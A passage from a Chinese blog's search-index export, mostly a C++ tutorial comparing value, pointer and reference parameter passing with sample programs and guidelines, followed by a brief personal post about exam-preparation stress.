class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int change(char *name) &#123;</span><br><span class="line">    cout &lt;&lt; &quot;************************修改之前************************&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;name&#x3D;&quot; &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&amp;name&quot; &lt;&lt; &amp;name &lt;&lt; endl;</span><br><span class="line">    name &#x3D; &quot;alter&quot;;</span><br><span class="line">    cout &lt;&lt; &quot;************************改变之后**************************&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;name&#x3D;&quot; &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&amp;name&quot; &lt;&lt; &amp;name &lt;&lt; endl;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char *str &#x3D; &quot;this is a test&quot;;</span><br><span class="line">    cout &lt;&lt; &quot;*************************Main-Before**********************&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;str&#x3D;&quot; &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&amp;str&#x3D;&quot; &lt;&lt; &amp;str&lt;&lt; endl;</span><br><span class="line">    change(str);</span><br><span class="line">    cout &lt;&lt; &quot;*************************Main-After**********************&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;str&#x3D;&quot; &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&amp;str&#x3D;&quot; &lt;&lt; &amp;str &lt;&lt; endl;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大家想出来结果来了，下面我来给出运行的结果</p><p><img src="/2017/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%5C%E6%8C%87%E9%92%88%E4%BC%A0%E5%80%BC2.png" alt="指针传值2"></p><p>不知道大家想的name的情况和运行的情况是否一样，我将给出我的分析</p><p> <img src="/2017/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%5C%E6%8C%87%E9%92%88%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%902.png" alt="指针结果分析2"></p><h3 id="三：引用传递"><a href="#三：引用传递" class="headerlink" title="三：引用传递"></a>三：引用传递</h3><pre><code>                   既然介绍那就来个代码实例吧</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">void swapref(int &amp;a, int &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; &quot;*****************交换之前******************&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;a&#x3D;&quot; &lt;&lt; a &lt;&lt; &quot; ,&quot; &lt;&lt; &quot;b&#x3D;&quot; &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&amp;a&#x3D;&quot; &lt;&lt; &amp;a &lt;&lt; &quot; ,&quot; &lt;&lt; &quot;&amp;b&#x3D;&quot; &lt;&lt; &amp;b &lt;&lt; endl;</span><br><span class="line">    int temp;</span><br><span class="line">    temp &#x3D; a;</span><br><span class="line">    a &#x3D; b;</span><br><span class="line">    b &#x3D; temp;</span><br><span class="line">    cout &lt;&lt; &quot;******************交换之后******************&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;a&#x3D;&quot; &lt;&lt; a &lt;&lt; &quot; ,&quot; &lt;&lt; &quot;b&#x3D;&quot; &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&amp;a&#x3D;&quot; &lt;&lt; &amp;a &lt;&lt; &quot; ,&quot; &lt;&lt; &quot;&amp;b&#x3D;&quot; &lt;&lt; &amp;b &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    int x &#x3D; 1;</span><br><span class="line">    int y &#x3D; 2;</span><br><span class="line">    cout &lt;&lt; &quot;******Main--Before*****&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;x&#x3D;&quot; &lt;&lt; x &lt;&lt; &quot; ,&quot; &lt;&lt; &quot;y&#x3D;&quot; &lt;&lt; y &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&amp;x&#x3D;&quot; &lt;&lt; &amp;x &lt;&lt; &quot; ,&quot; &lt;&lt; &quot;&amp;y&#x3D;&quot; &lt;&lt; &amp;y &lt;&lt; endl;</span><br><span class="line">    swapref(x, y);</span><br><span class="line">    cout &lt;&lt; &quot;*****MAIN--AFTER*****&quot; &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;x&#x3D;&quot; &lt;&lt; x &lt;&lt; &quot; ,&quot; &lt;&lt; &quot;y&#x3D;&quot; &lt;&lt; y &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; &quot;&amp;x&#x3D;&quot; &lt;&lt; &amp;x &lt;&lt; &quot; ,&quot; &lt;&lt; &quot;&amp;y&#x3D;&quot; &lt;&lt; &amp;y &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">形如：int &amp;a&#x3D;x; &#x2F;&#x2F;用于引用传递，可以理解为a就是x，x就是a，引用传递实参和形参是一样的，只不过名字不一样，下面贴出运行的结果（分析就不写了，都差不多）</span><br></pre></td></tr></table></figure><p> <img src="/2017/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%5C%E5%BC%95%E7%94%A8%E7%BB%93%E6%9E%9C.png" alt="引用结果">    </p><h3 id="那么我们就了解一下-引用类型-："><a href="#那么我们就了解一下-引用类型-：" class="headerlink" title="那么我们就了解一下**引用类型**    ："></a>那么我们就了解一下**<em>引用类型**</em>    ：</h3><p>​    由类型的实际值引用（类似于指针）表示的数据类型。如果为某个变量分配一个引用类型，则该变量将引用（或“指向”）原始值。不创建任何副本。引用类型包括类、接口、委托和装箱值类型。</p><p>​    <strong>引用</strong>具有指针的威力，但是调用<strong>引用</strong>传递的<strong>函数</strong>时，可读性却比指针传递<strong>好</strong>。<strong>引用</strong>具有传值方式<strong>函数</strong>调用语法的简单性与可读性，但是威力却比传值方式强。</p><h3 id="引用有优点又有缺点，缺点如图所介绍（这是笔者以前记录的，就不想写了直接截图了hh）"><a href="#引用有优点又有缺点，缺点如图所介绍（这是笔者以前记录的，就不想写了直接截图了hh）" class="headerlink" title="引用有优点又有缺点，缺点如图所介绍（这是笔者以前记录的，就不想写了直接截图了hh）"></a>引用有优点又有缺点，缺点如图所介绍（这是笔者以前记录的，就不想写了直接截图了hh）</h3><p> <img src="/2017/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%5C%E5%BC%95%E7%94%A8%E7%9A%84%E7%BC%BA%E7%82%B9.png" alt="引用的缺点"></p><h3 id="当然引用也有缺陷，如图"><a href="#当然引用也有缺陷，如图" class="headerlink" title="当然引用也有缺陷，如图"></a>当然引用也有缺陷，如图</h3><p>​    1）指针传递有一个缺点：新手一般都很容易犯错误的，就是指针传递需要开内存，如果忘记释放，可能导致内存泄漏。浪费大量内存，所以此时引用传递更好</p><p>​    2）引用传递的性质像指针传递，书写形式像值传递。当只需要借用一下别名时，就没必要用指针了.引用和值传递写法一样，这让函数的调用语法更加清晰，所以引用传递简单，这个也是C++新增加的功能</p><p><u>提示</u> ：</p><ul><li>在定义函数时，还可以让它以“引用传递”方式而不是以“值传递”方式返回：int &amp;myFuntion();</li><li>除了可以改变有关变量的值，“引用传递”方式还有一个好处就是它的开销相对要小一些。因为不需要再函数里创建临时变量来容纳那些值，只需复制对象的地址，程序的内存占用量当然会小一些。</li><li>如果想获得“引用传递”方式带来的性能改善，但不想改变改变某个变量的值，可以把相应的输入参数定义为一个常量：void myFunc(const int &amp;myNum),通过这样定义的函数，可以把具体的参数直接传递给它，例myFunc(2).</li></ul><p><code>void changeVar(int &amp;myVar,int newValue);  //引用传递</code></p><p>这个函数第一个输入的参数不是一个指针，它是那个将被传递给这个函数的原始变量的一个别名。在changeVar()函数里对这个参数变量进行的任何操作都将反映在changeVar()函数外的那个原始变量身上，这就意味着changeVar()函数与原来的一样</p><p><strong><em>参数传递方式概括：</em></strong></p><ul><li><p>当函数中的对象需要修改时，按传址方式传递对象，对象的改变可以映射到调用函数中</p></li><li><p>当函数中对象需要修改时，按传值方式传递对象，对象的改变不会映射到调用函数中</p></li><li><p>当函数中的对象不需要修改时，按传常址方式传递对象。这种方法可以获得性能提升，能够使浅在的运行时错误转换为编译错误。</p><hr><p>​</p></li></ul><p><strong>写了那么多，可以来一段总结，嘿嘿</strong></p><p>概念：</p><p>首先从概念上说一下几种函数传参方式及区别：</p><p>​    1.值传递：形参是实参的拷贝，改变函数形参的值并不会影响外部实参的值，这是常用的方法，也是最简单的一种，只需要传递参数，返回值那是return考虑的</p><p>​    2.指针传递：指针传递参数从本质上来说也是值传递，它传递的是地址。【值传递过程中，被调函数的形参作为被调函数的局部变量来处理，即在函数内的栈中开辟内存空间以存放由主调函数放进来的实参的值，从而成了实参的一个副本（记住：函数内参数是实参的副本）】。由于指针传递的是外部实参的地址，当被调函数的形参值发生改变时，自然外部实参值也发生改变</p><p>​    3.引用传递：被调函数的形参虽然也作为局部变量在栈中开辟了内存空间，但是栈中存放的是由主调函数放进的实参变量的地址。被调函数对形参的任何操作都被处理成间接寻址，即通过栈中存放的地址访问主调函数中实参变量（实参和形参通过引用，合二为一，说白点就是：一个人，有两个名字那种）。因此，形参的任何改动都会直接影响到实参。</p><hr><h3 id="使用引用参数的原因："><a href="#使用引用参数的原因：" class="headerlink" title="使用引用参数的原因："></a><strong>使用引用参数的原因：</strong></h3><p>​    1. 程序员能够修改调用函数中的数据对象</p><p>​    2. 通过传递引用而不是整个数据对象，可以提高程序的运行速度。</p><p>            当数据对象较大时（如结构和类对象），第二个原因最重要，这些也是使用指针参数的原因。这是有道理的，因为引用参数实际上是基于指针的代码的另一个接口。</p><p>    那么什么时候使用引用、什么时候使用指针？什么时候又应该按值传递呢？下面是一些**<em>指导原则**</em>：</p><h4 id="原则一：对于使用传递值而不做修改的函数："><a href="#原则一：对于使用传递值而不做修改的函数：" class="headerlink" title="原则一：对于使用传递值而不做修改的函数："></a><strong>原则一：对于使用传递值而不做修改的函数：</strong></h4><p>​    1.  如果数据对象较小，如内置数据类型或者小型结构，则按值传递。</p><p>​    2.  如果数据对象是数组，则使用指针，因为这是唯一的选择，并将指针声明为指向const的指针。</p><p>​    3.  如果数据对象是较大的结构，则使用const指针或const引用，以提高运行效率。这样可以节省复制结构所需的时间和空间。</p><p>​    4.如果数据对象是类对象，则使用const引用。类设计的语义常常要求使用引用，这是C++增加引用特性的主要原因。因此，传递类对象参数的标准方式是按引用传递。</p><h4 id="原则二：对于修改调用函数中数据的函数："><a href="#原则二：对于修改调用函数中数据的函数：" class="headerlink" title="原则二：对于修改调用函数中数据的函数："></a><strong>原则二：对于修改调用函数中数据的函数：</strong></h4><p>​    1. 如果数据对象是内置数据类型，则是用指针。如果看到诸如fixit(&amp;x)这样的代码（其中x是int型），则很明显，该函数将修改x。</p><p>​    2. 如果数据对象是数组，则只能使用指针。</p><p>​    3. 如果数据对象是结构，则使用引用或指针。</p><p>​    4.如果数据对象是类对象，则使用引用。</p><h3 id="引用和指针的区别："><a href="#引用和指针的区别：" class="headerlink" title="引用和指针的区别："></a><strong>引用和指针的区别</strong>：</h3><p>​    <strong><em>相同点：</em></strong></p><p>都是地址的概念，指针指向一个内存，内容就是指向内存的地址，二引用就是一块内存的地址</p><p>​    <strong><em>不同点</em></strong></p><p>​    ①引用仅仅是一个别名（不许奥分配内存），而指针是一个实体（需要分配内存）</p><p>​    ②引用定义时必须要初始化，且以后不可以改变，而指针不需要</p><pre><code>   ③引用不可以为空（null），但是指针可以为空</code></pre><p>​    ④引用不可以是const类型的，而指正可以是，且const类型的指针和引用更相似</p><p>​    ⑤引用无序解引用（*），而指针需要</p><pre><code>  ⑥sizeof（引用）的值是指向变量的大小，而sizeof（指针）的值是指针的大小（32位）是4</code></pre><p>​    7.引用和指针的自增（++）和自减（–）的含义不同</p>]]></content>
      
      
      <categories>
          
          <category> 函数调用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>-行动需要一直进行下去-</title>
      <link href="/2017/04/04/%E6%84%9F%E6%83%B3/"/>
      <url>/2017/04/04/%E6%84%9F%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<ul><li>​       随着毕业的步伐雨来越快，越来越来越觉得时间过的越来越快，而自己越来越觉得自己学的东西华而不实，完全不成正比啊，<a id="more"></a>空虚而非满腹经书。所以在今后的一段时间内准备每周抽一点的时间来接进行专业知识的总结归纳，希望通过这种方法来进行自我知识的加深和深刻的理解</li><li>最近一段时间发现复习的时间还是蛮紧张的，每天需要的做到事情实在是太多了，要学习的东西也是在是太多了。这两天看了了一下计算机的408，瞬时间感觉，怎么能搞这么多，这么可以这么难啊，咋办？想来想去，唯有付出更多的努力才能获得更多的收获，赶紧去学习去了</li></ul><p>附上几张梦想之地的图片</p><p> <img src="/2017/04/04/%E6%84%9F%E6%83%B3/%E6%84%9F%E6%83%B3%5C1.jpg" alt="1"></p><p> <img src="/2017/04/04/%E6%84%9F%E6%83%B3/%E6%84%9F%E6%83%B3%5C3.jpg" alt="3"> <img src="/2017/04/04/%E6%84%9F%E6%83%B3/%E6%84%9F%E6%83%B3%5C2.jpg" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> 每日一感 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 心灵鸡汤 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
